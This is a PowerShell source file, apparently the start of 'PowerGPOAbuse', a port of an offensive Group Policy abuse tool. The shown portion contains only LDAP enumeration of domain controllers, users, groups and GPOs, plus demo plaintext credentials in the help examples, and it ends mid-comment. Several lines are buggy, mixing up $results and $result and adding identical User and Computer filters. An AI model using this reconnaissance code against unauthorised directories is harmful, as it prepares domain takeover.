#Requires -version 2

<#

    PowerShell version of SharpGPOAbuse

    Author: Lancelot_ps1 (@rootSySdk) (except for Get-Domain, sightly modified from PowerView)

#>


function Get-Domain {

<#

    .SYNOPSIS

        Returns the domain object for the current (or specified) domain.

        Author: Will Schroeder (@harmj0y)  
        License: BSD 3-Clause  
        Required Dependencies: None  

    .DESCRIPTION

        Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
        domain or the domain specified with -Domain X.

    .PARAMETER Domain

        Specifies the domain name to query for, defaults to the current domain.

    .PARAMETER Credential

        A [System.Management.Automation.PSCredential] object of alternate credentials
        for connection to the target domain.

    .EXAMPLE

        Get-Domain -Domain testlab.local

    .EXAMPLE

        $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
        $Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
        Get-Domain -Credential $Cred

    .LINK

        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG

#>

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]

    Param(

        [Parameter(Mandatory=$false, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    PROCESS {

        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[Get-Domain] Using alternate credentials for Get-Domain'

            if ($PSBoundParameters['Domain']) {

                $TargetDomain = $Domain
            }
            else {

                # if no domain is supplied, extract the logon domain from the PSCredential passed
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                if ($TargetDomain -ne "") {

                    Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from -Credential"
                } else {

                    $TargetDomain = $env:USERDNSDOMAIN
                    Write-Verbose "[Get-Domain] Extracted domain '$TargetDomain' from environment variable"
                }
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {

                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {

                Write-Verbose "[Get-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        } elseif ($PSBoundParameters['Domain']) {

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)

            try {

                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {

                Write-Verbose "[Get-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        } else {

            try {

                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {

                Write-Verbose "[Get-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}

function Invoke-DomainSearcher {

<#

    .SYNOPSIS

        This function aims to search for object through LDAP.

    .DESCRIPTION

        It creates an instance of a directorysearch C# class, apply the provided filter, returns the result.

    .PARAMETER Filter

        LDAP filter to apply.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

#>

    [OutputType([System.DirectoryServices.SearchResultCollection])]
    [CmdletBinding()]

    Param (

        [Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Filter,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $commonArgs = @{}
        if ($PSBoundParameters["Domain"]) {$commonArgs["Domain"] = $Domain}
        if ($PSBoundParameters["Credential"]) {$commonArgs["Credential"] = $Credential}

        $domainObj = Get-Domain @commonArgs

        if ($PSBoundParameters["DomainController"]) {

            $PDC = (Find-DomainController @commonArgs -Identity $DomainController).dnshostname
        } else {

            $PDC = ($domainObj.PdcRoleOwner).Name
        }
    }

    PROCESS {

        try {

            $SearchString = "LDAP://"
            $SearchString += $PDC + "/"
            $DistinguishedName = "DC=$($domainObj.Name.Replace('.',	',DC='))"
            $SearchString += $DistinguishedName
            Write-Verbose "[Invoke-DomainSearcher] Search base: $SearchString"
            if ($PSBoundParameters['Credential']) {

                $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString, $Credential.GetNetworkCredential().UserName, $Credential.GetNetworkCredential().Password)
            } else {

                $Searcher = New-Object System.DirectoryServices.DirectorySearcher(New-Object System.DirectoryServices.DirectoryEntry $SearchString)
            }
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry
            $Searcher.SearchRoot = $objDomain
            $Searcher.Filter = $Filter
            $result = $Searcher.FindAll()
        } catch {

            Write-Verbose "[Invoke-DomainSearcher] Error while research $_"
        }
        
    }

    END {

        return $result

        $Searcher.Dispose()
    }
}

function Find-DomainController {

<#

    .SYNOPSIS

        Return a list of domain controller.

    .DESCRIPTION

        If function is called without argument it returns a PSCustomObject from an LDAP search for a DC. 
        Else it returns the raw object from Get-Domain.

    .PARAMETER Server

        Domain Controller Identity.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER Credential

        PSCredential to use for connection.

    .PARAMETER API

        Use [System.DirectoryServices.ActiveDirectory] API to find DCs.

    .PARAMETER LDAPFilter

        Additional LDAP filter to use in the research.

    .PARAMETER Raw

        Returns raw object from research.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER Credential

        PSCredential to use for connection.

#>

    [OutputType([System.DirectoryServices.ActiveDirectory.DomainController], [System.Object[]], [System.DirectoryServices.SearchResult], [System.Management.Automation.PSCustomObject])]
    [OutputType('PowerGPOAbuse.DomainController')]
    [CmdletBinding()]
    param (

        [Parameter(Mandatory=$false, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("DomainController", "Identity")]
        [String]
        $Server,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [Switch]
        $API = $false,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Filter")]
        [String]
        $LDAPFilter,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [Switch]
        $Raw,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$true)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $arguments = @{}

        if ($PSBoundParameters['Credential']) {$arguments['Credential'] = $Credential}
        if ($PSBoundParameters['Domain']) {$arguments['Domain'] = $Domain}

        $finalFilter = ""

        if ($PSBoundParameters["LDAPFilter"]) {

            if ($LDAPFilter.Contains("(") -and $LDAPFilter.Contains(")")) {

                $finalFilter += $LDAPFilter
            } else {

                Write-Verbose "[Find-DomainController] Wrong LDAP filter provided"
            }
        }
    }
    
    PROCESS {

        if ($API) {

            if ($PSBoundParameters["Server"]) {

                $domainObj = Get-Domain @arguments
                $DomainControllers = $domainObj.DomainControllers
                if (-not $DomainControllers.Name.Contains($Server)) {
                    
                    Write-Verbose "[Find-DomainController] impossible to find $Server"
                    $DomainControllers = $null
                }
            } else {

                $domainObj = Get-Domain @arguments
                $DomainControllers = $domainObj.DomainControllers
            }
        } else {

            if ($PSBoundParameters["Server"]) {
                
                if ($Server.Contains("LDAP://")) {

                    $Filter = "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=8192)(distinguishedName=$($Server.Replace('LDAP://', '')))$finalFilter)"
                } elseif (($Server -split "-") -eq 8) {

                    $Filter = "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=8192)(objectSid=$Server)$finalFilter)"
                } elseif ($Server.Contains("$")) {

                    $Filter = "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=8192)(|(samAccountName=$Server)(name=$Server))$finalFilter)"
                } elseif ($Server.Contains(",") -and $Server.Contains("DC=")) {

                    $Filter = "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=8192)(distinguishedName=$Server)$finalFilter)"
                } elseif ($Server.Split(".").Count -ge 3) {

                    $Filter = "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=8192)(dnshostname=$Server)$finalFilter)"
                } else {

                    $Filter = "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=8192)(|(name=$Server)(cn=$Server))$finalFilter)"
                }
            } else {

                $Filter = "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=8192)$finalFilter)"
            }

            Write-Verbose "[Find-DomainController] LDAP filter: $Filter"

            $results = Invoke-DomainSearcher @arguments -Filter $Filter

            if (-not $Raw.IsPresent) {

                $DomainControllers = @()

                foreach ($result in $results) {

                    $psObject = New-Object System.Management.Automation.PSObject -Property @{
                
                    "ridsetreferences" = $result.Properties.ridsetreferences -as [System.String];
                    "logoncount" = $result.Properties.logoncount -as [System.String];
                    "codepage" = $result.Properties.codepage -as [System.String];
                    "objectcategory" = $result.Properties.objectcategory -as [System.String];
                    "msdfsr-computerreferencebl" = $result.Properties."msdfsr-computerreferencebl" -as [System.String];
                    "iscriticalsystemobject" = $result.Properties.iscriticalsystemobject -as [System.String];
                    "operatingsystem" = $result.Properties.operatingsystem -as [System.String];
                    "usnchanged" = $result.Properties.usnchanged -as [System.String];
                    "instancetype" = $result.Properties.instancetype -as [System.String];
                    "name" = $result.Properties.name -as [System.String];
                    "badpasswordtime" = $result.Properties.badpasswordtime -as [System.String];
                    "pwdlastset" = $result.Properties.pwdlastset -as [System.String];
                    "objectclass" = $result.Properties.objectclass -as [System.String];
                    "badpwdcount" = $result.Properties.badpwdcount -as [System.String];
                    "samaccounttype" = $result.Properties.samaccounttype -as [System.String];
                    "lastlogontimestamp" = $result.Properties.lastlogontimestamp -as [System.String];
                    "usncreated" = $result.Properties.usncreated -as [System.String];
                    "objectguid" = ConvertFrom-LDAPGuid -GUID $results.Properties.objectguid[0] ;
                    "memberof" = $result.Properties.memberof -as [System.String];
                    "whencreated" = $result.Properties.whencreated -as [System.String];
                    "adspath" = $result.Properties.adspath -as [System.String];
                    "dnshostname" = $results.Properties.dnshostname -as [System.String];
                    "useraccountcontrol" = $result.Properties.useraccountcontrol -as [System.String];
                    "cn" = $result.Properties.cn -as [System.String];
                    "countrycode" = $result.Properties.countrycode -as [System.String];
                    "primarygroupid" = $result.Properties.primarygroupid -as [System.String];
                    "whenchanged" = $result.Properties.whenchanged -as [System.String];
                    "lastlogon" = $result.Properties.lastlogon -as [System.String];
                    "distinguishedname" = $result.Properties.distinguishedname -as [System.String];
                    "samaccountname" = $result.Properties.samaccountname -as [System.String];
                    "objectsid" = ConvertFrom-LDAPSid -SID $result.Properties.objectsid[0] ;
                    "lastlogoff" = $result.Properties.lastlogoff -as [System.String];
                    "accountexpires" = $result.Properties.accountexpires -as [System.String];
                }

                    $psObject.psObject.TypeNames.Insert(0, "PowerGPOAbuse.DomainController")
                    $DomainControllers += $psObject
                }
            } else {

                if ($results.Count -gt 1) {

                    Write-Warning -Message "[Find-DomainController] More than 1 result"    
                }

                $DomainControllers = $results
            }
        }   
    }
    
    END {
        
        return $DomainControllers
    }
}

function Get-DomainUser {

<#

    .SYNOPSIS
    
        Returns the properties of a set of users.

    .DESCRIPTION

        It will first create a LDAP filter, give it to Invoke-DomainSearcher, and return a PSCustomObject.

    .PARAMETER UserIdentity

        Set the Identity of the user which we are looking for.
        Accept samaccountname/SID/disguishedname/LDAP Path.

    .PARAMETER Properties

        Specific(s) property(ies) to return.

    .PARAMETER LDAPFilter

        Additional LDAP filter to use in the research.

    .PARAMETER Raw

        Returns raw object from research.

    .PARAMETER Domain

        Set the target domain.

    .PARAMETER DomainController

        Set the target domain controller.

    .PARAMETER Credential

        PSCredential to use for connection.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Get-DomainUser -UserIdentity 'Administrator' -Domain contoso.com -Credential $cred
    
    .EXAMPLE

        Get-DomainUser -UserIdentity 'Administrator' -Domain contoso.com

    .EXAMPLE

        Get-DomainUser -UserIdentity 'Administrator'

#>

    [OutputType([System.Object[]], [System.DirectoryServices.SearchResult], [System.Management.Automation.PSCustomObject])]
    [OutputType('PowerGPOAbuse.User')]
    [CmdletBinding()]

    param (

        [Parameter(Mandatory=$false, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Identity")]
        [String]
        $UserIdentity,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Filter")]
        [String]
        $LDAPFilter,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$true)]
        [Switch]
        $Raw,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,
        
        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$true)]
        [Management.Automation.CredentialAttribute()]
        [Management.Automation.PSCredential]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    
    BEGIN {

        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

        $finalFilter = ""

        if ($PSBoundParameters["LDAPFilter"]) {

            if ($LDAPFilter.Contains("(") -and $LDAPFilter.Contains(")")) {

                $finalFilter += $LDAPFilter
            } else {

                Write-Verbose "[Get-DomainUser] Wrong LDAP filter provided"
            }
        }
    }

    PROCESS {

        if ($PSBoundParameters["UserIdentity"]) {

            if ($UserIdentity.Split("-").Count -eq 8) {

                $Filter = "(&(samAccountType=805306368)(objectSid=$UserIdentity)$finalFilter)"
            } elseif ($UserIdentity.Split("-").Count -eq 5) {
            
                $Filter = "(&(samAccountType=805306368)(objectGuid=$(ConvertTo-LDAPGuid -GUID $UserIdentity))$finalFilter)"
            } elseif ($UserIdentity.Contains("LDAP://")) {

                $Filter = "(&(samAccountType=805306368)(distinguishedName=$($UserIdentity.Replace('LDAP://', '')))$finalFilter)"
            } elseif ($UserIdentity.Contains(",") -and $UserIdentity.Contains("DC=")) {

                $Filter = "(&(samAccountType=805306368)(distinguishedName=$UserIdentity)$finalFilter)"
            } else {

                $Filter = "(&(samAccountType=805306368)(|(cn=$UserIdentity)(name=$UserIdentity)(samAccountName=$UserIdentity))$finalFilter)"
            }
        } else {

            $Filter = "(&(samAccountType=805306368)$finalFilter)"
        }

        Write-Verbose "[Get-DomainUser] LDAP filter: $Filter"

        $results = Invoke-DomainSearcher @arguments -Filter $Filter

        if (-not $Raw.IsPresent) {

            $users = @()

            foreach ($result in $results) {

                $psObject = New-Object System.Management.Automation.PSObject -Property @{
            
                    "logoncount" = $result.Properties.logoncount -as [System.String];
                    "codepage" = $result.Properties.codepage -as [System.String];
                    "objectcategory" = $result.Properties.objectcategory -as [System.String];
                    "dscorepropagationdata" = $result.Properties.dscorepropagationdata -as [System.String];
                    "usnchanged" = $result.Properties.usnchanged -as [System.String];
                    "instancetype" = $result.Properties.instancetype -as [System.String];
                    "name" = $result.Properties.name -as [System.String];
                    "badpasswordtime" = $result.Properties.badpasswordtime -as [System.String];
                    "pwdlastset" = $result.Properties.pwdlastset -as [System.String];
                    "objectclass" = $result.Properties.objectclass ;
                    "badpwdcount" = $result.Properties.badpwdcount -as [System.String];
                    "samaccounttype" = $result.Properties.samaccounttype -as [System.String];
                    "lastlogontimestamp" = $result.Properties.lastlogontimestamp -as [System.String];
                    "usncreated" = $result.Properties.usncreated -as [System.String];
                    "objectguid" = ConvertFrom-LDAPGuid -GUID $result.Properties.objectguid[0] ;
                    "memberof" = $result.Properties.memberof ;
                    "whencreated" = $result.Properties.whencreated -as [System.String];
                    "adspath" = $result.Properties.adspath -as [System.String];
                    "useraccountcontrol" = $result.Properties.useraccountcontrol -as [System.String];
                    "cn" = $result.Properties.cn -as [System.String];
                    "countrycode" = $result.Properties.countrycode -as [System.String];
                    "primarygroupid" = $result.Properties.primarygroupid -as [System.String];
                    "whenchanged" = $result.Properties.whenchanged -as [System.String];
                    "lastlogon" = $result.Properties.lastlogon -as [System.String];
                    "distinguishedname" = $result.Properties.distinguishedname -as [System.String];
                    "samaccountname" = $result.Properties.samaccountname -as [System.String];
                    "objectsid" = ConvertFrom-LDAPSid -SID $result.Properties.objectsid[0] ;
                    "lastlogoff" = $result.Properties.lastlogoff -as [System.String];
                    "accountexpires" = $result.Properties.accountexpires -as [System.String]; 
                }

                $psObject.psObject.TypeNames.Insert(0, "PowerGPOAbuse.User")
                $users += $psObject
            }
        } else {

            if ($results.Count -gt 1) {

                Write-Warning -Message "[Get-DomainUser] More than 1 result"
            }

            $users = $results           
        }
    }

    END {

        if ($PSBoundParameters["Properties"]) {

            return ($users | Select-Object -Property $Properties | Format-List)
        } else {

            return $users
        }
    }
}

function Get-DomainGroup {

<#

    .SYNOPSIS
    
        Returns the properties of a set of groups.

    .DESCRIPTION

        It will first create a LDAP filter, give it to Invoke-DomainSearcher, and return a PSCustomObject.

    .PARAMETER GroupIdentity

        Set the Identity of the group for which we are looking for.
        Accept samaccountname/SID/disguishedname/LDAP Path.

    .PARAMETER Properties

        Specific(s) property(ies) to return.

    .PARAMETER LDAPFilter

        Additional LDAP filter to use in the research.

    .PARAMETER Raw

        Returns raw object from research.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Get-DomainGroup -GroupIdentity 'Administrators' -Domain contoso.com -Credential $cred
    
    .EXAMPLE

        Get-DomainGroup -GroupIdentity 'Administrators' -Domain contoso.com

    .EXAMPLE

        Get-DomainGroup -GroupIdentity 'Administrators'


#>
    
    [OutputType([System.Object[]], [System.DirectoryServices.SearchResult], [System.Management.Automation.PSCustomObject])]
    [OutputType('PowerGPOAbuse.Group')]
    [CmdletBinding()]

    param (

        [Parameter(Mandatory=$false, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Identity")]
        [String]
        $GroupIdentity,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(Mandatory=$false,Position=2, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Filter")]
        [String]
        $LDAPFilter,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$false)]
        [Switch]
        $Raw,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=6,ValueFromPipeline=$true)]
        [System.Management.Automation.CredentialAttribute()]
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty

    )

    BEGIN {

        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

        $finalFilter = ""

        if ($PSBoundParameters["LDAPFilter"]) {

            if ($LDAPFilter.Contains("(") -and $LDAPFilter.Contains(")")) {

                $finalFilter += $LDAPFilter
            } else {

                Write-Verbose "[Get-DomainGroup] Wrong LDAP filter provided"
            }
        }
    }

    PROCESS {

        if ($PSBoundParameters["GroupIdentity"]) {

            if ($GroupIdentity.Split("-").Count -eq 8) {

                $Filter = "(&(samAccountType=268435456)(objectSid=$GroupIdentity)$finalFilter)"
            } elseif ($GroupIdentity.Split("-").Count -eq 5) {
                
                $Filter = "(&(samAccountType=268435456)(objectGuid=$(ConvertTo-LDAPGuid -GUID $GroupIdentity))$finalFilter)"
            } elseif ($GroupIdentity.Contains("LDAP://")) {

                $Filter = "(&(samAccountType=268435456)(distinguishedName=$($GroupIdentity.Replace('LDAP://','')))$finalFilter)"
            } elseif ($GroupIdentity.Contains(",") -and $GroupIdentity.Contains("DC=")) {

                $Filter = "(&(samAccountType=268435456)(distinguishedName=$GroupIdentity)$finalFilter)"
            } else {

                $Filter = "(&(samAccountType=268435456)(|(name=$GroupIdentity)(cn=$GroupIdentity)(samAccountName=$GroupIdentity))$finalFilter)"
            }
        } else {

            $Filter = "(&(samAccountType=268435456)$finalFilter)"
        }

        Write-Verbose "[Get-DomainGroup] LDAP filter: $Filter"

        $results = Invoke-DomainSearcher @arguments -Filter $Filter

        if (-not $Raw.IsPresent) {

            $groups = @()

            foreach ($result in $results) {

                $psObject = New-Object System.Management.Automation.PSObject -Property @{

                    "usnchanged" = $result.Properties.usnchanged -as [System.String];
                    "distinguishedname" = $result.Properties.distinguishedname -as [System.String];
                    "grouptype" = $result.Properties.grouptype -as [System.String];
                    "whencreated" = $result.Properties.whencreated -as [System.String];
                    "samaccountname" = $result.Properties.samaccountname -as [System.String];
                    "objectsid" = ConvertFrom-LDAPSid -SID $result.Properties.objectsid[0] ;
                    "instancetype" = $result.Properties.instancetype -as [System.String];
                    "adspath" = $result.Properties.adspath -as [System.String];
                    "usncreated" = $result.Properties.usncreated -as [System.String];
                    "whenchanged" = $result.Properties.whenchanged -as [System.String];
                    "member" = $result.Properties.member ;
                    "samaccounttype" = $result.Properties.samaccounttype -as [System.String];
                    "objectguid" = ConvertFrom-LDAPGuid -GUID $result.Properties.objectguid[0] ;
                    "objectcategory" = $result.Properties.objectcategory -as [System.String];
                    "objectclass" = $result.Properties.objectclass ;
                    "dscorepropagationdata" = $result.Properties.dscorepropagationdata -as [System.String];
                    "name" = $result.Properties.name -as [System.String];
                }

                $psObject.psObject.TypeNames.Insert(0, "PowerGPOAbuse.Group")
                $groups += $psObject
            }
        } else {

            if ($results.Count -gt 1) {

                Write-Warning -Message "[Get-DomainGroup] More than 1 result"    
            }

            $groups = $results
        }
    }

    END {

        if ($PSBoundParameters["Properties"]) {

            return ($groups | Select-Object -Property $Properties | Format-List)
        } else {

            return $groups
        }
    }
}

function Get-DomainGPO {

<#

    .SYNOPSIS
    
        Returns the properties of a set of GPOs.

    .DESCRIPTION

        It will first create a LDAP filter, give it to Invoke-DomainSearcher, and return a PSCustomObject.

    .PARAMETER GroupIdentity

        Set the Identity of the group for which we are looking for.
        Accept displayName/name/LDAP Path.

    .PARAMETER Properties

        Specific(s) property(ies) to return.

    .PARAMETER User

        Search only for GPOs which apply user settings

    .PARAMETER Computer

        Search only for GPOs which apply computer settings

    .PARAMETER LDAPFilter

        Additional LDAP filter to use in the research.

    .PARAMETER Raw

        Returns raw object from research.

    .EXAMPLE

        $pass = ConvertTo-SecureString -AsPlainText -Force "passw0rd"
        $cred = New-Object System.Management.Automation.PSCredential('Bobby', $pass)
        Get-DomainGPO -GroupGPO 'SuperSecureGPO' -Domain contoso.com -Credential $cred
    
    .EXAMPLE

        Get-DomainGPO -GPOIdentity 'SuperSecureGPO' -Domain contoso.com

    .EXAMPLE

        Get-DomainGPO -GPOIdentity 'SuperSecureGPO'

#>

    [OutputType([System.Object[]], [System.DirectoryServices.SearchResult], [System.Management.Automation.PSCustomObject])]
    [OutputType('PowerGPOAbuse.GPO')]
    [CmdletBinding()]

    param (

        [Parameter(Mandatory=$false, Position=0, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Identity")]
        [String]
        $GPOIdentity,

        [Parameter(Mandatory=$false, Position=1, ValueFromPipeline=$true)]
        [String[]]
        $Properties,

        [Parameter(Mandatory=$false, Position=2, ValueFromPipeline=$false)]
        [Switch]
        $User = $false,

        [Parameter(Mandatory=$false, Position=3, ValueFromPipeline=$false)]
        [Switch]
        $Computer = $false,

        [Parameter(Mandatory=$false, Position=4, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [Alias("Filter")]
        [String]
        $LDAPFilter,

        [Parameter(Mandatory=$false, Position=5, ValueFromPipeline=$false)]
        [Switch]
        $Raw,

        [Parameter(Mandatory=$false, Position=6, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(Mandatory=$false, Position=7, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DomainController,

        [Parameter(Mandatory=$false, Position=8, ValueFromPipeline=$false)]
        [Management.Automation.CredentialAttribute()]
        [Management.Automation.PSCredential]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $arguments = @{}

        if ($PSBoundParameters["Domain"]) {$arguments["Domain"] = $Domain}
        if ($PSBoundParameters["DomainController"]) {$arguments["DomainController"] = $DomainController}
        if ($PSBoundParameters["Credential"]) {$arguments["Credential"] = $Credential}

        $finalFilter = ""

        if ($PSBoundParameters["LDAPFilter"]) {

            if ($LDAPFilter.Contains("(") -and $LDAPFilter.Contains(")")) {

                $finalFilter += $LDAPFilter
            } else {

                Write-Verbose "[Get-DomainGPO] Wrong LDAP filter provided"
            }
        }

        if ($User) {

            $finalFilter += "(!(flags:1.2.840.113556.1.4.803:=1))"
        }

        if ($Computer) {

            $finalFilter += "(!(flags:1.2.840.113556.1.4.803:=1))"
        }
    }
    
    PROCESS {

        if ($PSBoundParameters["GPOIdentity"]) {

            if ($GPOIdentity.Split("-").Count -eq 5) {

                $Filter = "(&(|(name=$GPOIdentity)(ObjectGuid=$(ConvertTo-LDAPGuid -GUID $GPOIdentity)))(ObjectClass=groupPolicyContainer)$finalFilter)"
            } elseif ($GPOIdentity.Contains("LDAP://")) {
            
                $Filter = "(&(distinguishedName=$($GPOIdentity.Replace("LDAP://",'')))(ObjectClass=groupPolicyContainer)$finalFilter)"           
            } elseif ($GPOIdentity.Contains(",") -and $GPOIdentity.Contains("DC=")) {

                $Filter = "(&(distinguishedName=$GPOIdentity)(ObjectClass=groupPolicyContainer)$finalFilter)"

            } else {

                $Filter = "(&(displayName=$GPOIdentity)(ObjectClass=groupPolicyContainer)$finalFilter)"
            }
        } else {

            $Filter = "(&(ObjectClass=groupPolicyContainer)$finalFilter)"
        }

        Write-Verbose "[Get-DomainGPO] LDAP filter: $Filter"

        $results = Invoke-DomainSearcher @arguments -Filter $Filter

        if (-not $Raw) {

            $gpos = @()

            foreach ($result in $results) {

                $psObject = New-Object System.Management.Automation.PSObject -Property @{

                    "displayName" = $result.Properties.displayname -as [System.String];
                    "adspath" = $result.Properties.adspath -as [System.String];
                    "gpcfunctionalityversion" = $result.Properties.gpcfunctionalityversion -as [System.String]; 
                    "gpcfilesyspath" = $result.Properties.gpcfilesyspath -as [System.String];
                    "versionnumber" = $result.Properties.versionnumber -as [System.String];
                    "instancetype" = $result.Properties.instancetype -as [System.String];
                    "whencreated" = $result.Properties.whencreated -as [System.String];
                    "usncreated" = $result.Properties.usncreated -as [System.String];
                    "flags" = $result.Properties.flags -as [System.String];
                    "whenchanged" = $results.Properties.whenchanged -as [System.String];
                    "cn" = $result.Properties.cn -as [System.String];
                    "objectguid" = ConvertFrom-LDAPGuid -GUID $result.Properties.objectguid[0];
                    "distinguishedname" = $result.Properties.distinguishedname -as [System.String];
                    "objectcategory" = $result.Properties.objectcategory -as [System.String];
                    "objectclass" = $result.Properties.objectclass;
                    "dscorepropagationdata" = $result.Properties.dscorepropagationdata -as [System.String];
                    "name" = $result.Properties.name -as [System.String]
                }

                if (-not ($null -eq $result.Properties.gpcmachineextensionnames -or $result.Properties.gpcmachineextensionnames -eq "")) {

                    $psObject | Add-Member gpcmachineextensionnames $result.Properties.gpcmachineextensionnames
                } elseif (-not ($null -eq $result.Properties.gpcuserextensionnames -or $result.Properties.gpcuserextensionnames -eq "")) {

                    $psObject | Add-Member gpcuserextensionnames $result.Properties.gpcuserextensionnames
                }
            
                $psObject.psObject.TypeNames.Insert(0, "PowerGPOAbuse.GPO")
                $gpos += $psObject
            }
        } else {

            if ($results.Count -gt 1) {

                Write-Warning -Message "[Get-DomainGPO] More than 1 result"    
            }

            $gpos = $results
        }
    }

    END {

        if ($PSBoundParameters["Properties"]) {

            return ($gpos | Select-Object -Property $Properties | Format-List)
        } else {
        
            return $gpos
        }    
    }
}

function Get-DomainOU {

<#

    .SYNOPSIS
    
        Returns the properties of a set of OUs.

    .DESCRIPTION

        It will first create a LDAP filter, give it to Invoke-DomainSearcher, and return a PSCustomObject.

    .PARAMETER GroupIdentity

        Set the Identity of the group for which we are looking for.

